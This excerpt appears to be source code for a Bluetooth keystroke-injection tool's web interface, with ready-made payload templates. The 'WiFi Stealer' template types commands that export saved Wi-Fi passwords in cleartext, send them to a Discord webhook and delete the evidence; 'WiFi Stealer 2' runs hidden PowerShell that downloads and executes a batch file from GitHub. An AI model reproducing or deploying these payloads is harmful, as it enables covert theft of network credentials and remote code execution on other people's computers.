...
// Type a string char-by-char — fast mode with minimal BLE delay
// Uses write() for single HID report per char (faster than press+release)
...
<button class="secondary" onclick="loadTemplate(10)" style="font-size:12px">WiFi Stealer 2</button>
</div>
</div>
...
var loadTemplate=function(id){
  ...
  switch(id){
    ...
    case 5:
      ...
      break;
    case 6:
      t="// WiFi Stealer - Send to Discord\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(100);\nKeyboard.releaseAll();\ndelay(100);\nKeyboard.print(\"cmd /k mode con: cols=25 lines=1\");\ndelay(100);\nKeyboard.write(KEY_RETURN);\ndelay(700);\nKeyboard.print(\"cd %temp%\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"netsh wlan export profile key=clear\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"powershell \\\"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+[char]10+'Password: '+$p+[char]10+'---'+[char]10}; $m='```'+[char]10+($x -join '')+[char]10+'```'; irm [webhookurl] -Method POST -Body (ConvertTo-Json @{content=$m}) -ContentType 'application/json'\\\"\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"del Wi* /s/f/q\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
      break;
    case 7:
    ...
    case 8:
      ...
      break;
    case 9:
      t="// WiFi Stealer 2 - Download & Run via BAT\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(100);\nKeyboard.releaseAll();\ndelay(700);\nKeyboard.print(\"powershell -w hidden iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/wifi_script.bat' -OutFile $env:TEMP\\\\f.bat;start $env:TEMP\\\\f.bat\");\nKeyboard.write(KEY_RETURN);\ndelay(7500);\nKeyboard.press(KEY_LEFT_ARROW);\ndelay(200);\nKeyboard.press(KEY_RETURN);\n";
      break;
  }
